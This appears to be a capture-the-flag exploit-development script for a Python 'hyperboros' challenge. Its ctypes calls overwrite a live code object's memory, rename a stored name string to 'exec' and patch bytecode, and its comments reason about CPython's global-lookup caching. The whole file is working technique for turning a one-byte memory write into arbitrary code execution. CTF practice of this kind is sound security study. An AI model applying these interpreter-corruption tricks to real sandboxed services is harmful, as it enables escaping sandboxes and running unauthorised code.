import ctypes, struct, builtins
_memmove = ctypes.memmove

def hyperboros():
    offset = int(input('offset\n>> '))
    char = bytes.fromhex(input('char\n>> '))
    assert len(char) == 1
    ctypes.memmove(id(hyperboros.__code__) + offset, char, len(char))

code = hyperboros.__code__
code_id = id(code)
BC = 192

_input = builtins.input
call_n = [0]
def fake(p=''):
    call_n[0] += 1
    return '0' if call_n[0]%2 else '00'

def run():
    builtins.input = fake
    call_n[0] = 0
    try: hyperboros(); return "ok"
    except Exception as e: return f"{type(e).__name__}: {e}"
    finally: builtins.input = _input

def get_rel(oid, off): return oid - code_id + off
def spatch(obj, s):
    oid = id(obj)
    _memmove(code_id+get_rel(oid,40), s.encode()+b'\x00'*(len(obj)-len(s)), len(obj))
    _memmove(code_id+get_rel(oid,16), struct.pack('<Q',len(s)), 8)
    _memmove(code_id+get_rel(oid,24), struct.pack('<q',hash(s)), 8)
def spatch_list(obj, s):
    oid = id(obj)
    return [
        (get_rel(oid,40), s.encode()+b'\x00'*(len(obj)-len(s))),
        (get_rel(oid,16), struct.pack('<Q',len(s))),
        (get_rel(oid,24), struct.pack('<q',hash(s))),
    ]

with open('/tmp/f.txt','w') as f: f.write('LNC26{test_local_flag}')
spatch(code.co_names[8], 'exec')

mem_orig = bytes((ctypes.c_char*96).from_address(code_id+BC))
new_bc = bytearray(mem_orig)
new_bc[3] = 0x11
new_bc[23] = 0x00
new_bc[40] = 0x01; new_bc[41] = 0x00
new_bc[42] = 0x79; new_bc[43] = 0x00
_memmove(code_id+BC, bytes(new_bc), 96)

# Run once and check what opcode[2] becomes
result = run()
after = bytes((ctypes.c_char*44).from_address(code_id+BC))
print(f"after run opcode[2]: {after[2]:02x} arg[3]: {after[3]:02x}")
print(f"full [2:12]: {after[2:12].hex()}")
print(f"result: {result}")

# 0xfe = LOAD_GLOBAL_BUILTIN  -> uses builtins cache, perfect for exec!
# 0xfd = LOAD_GLOBAL_MODULE   -> uses globals cache, wrong!
# If 0xfd: we need to prevent re-specialization to module
# Fix: keep version mismatch so it stays 0x74 (unspecialized)
# OR: let it specialize to 0xfe (builtin) by ensuring exec NOT in globals

print(f"\n'exec' in globals: {'exec' in hyperboros.__globals__}")
print(f"'exec' in builtins: {hasattr(builtins, 'exec')}")

# If exec not in globals, specialization -> LOAD_GLOBAL_BUILTIN (0xfe) 
# LOAD_GLOBAL_BUILTIN caches builtins dict index for 'exec'
# This is what we want!
# But if 'hyperboros' was in globals and got renamed to 'exec',
# globals still has that entry (under corrupted key)...
# The corrupted key has hash('hyperboros') != hash('exec')
# So globals lookup for 'exec' misses -> falls to builtins -> LOAD_GLOBAL_BUILTIN ✓

# If after run it's 0xfe, problem is elsewhere
# If 0xfd, need to also remove 'hyperboros' entry from globals

# Check after fixing: run multiple times
for i in range(3):
    r = run()
    op = bytes((ctypes.c_char*4).from_address(code_id+BC+2))
    print(f"run {i+1}: {r}, opcode={op[0]:02x}")
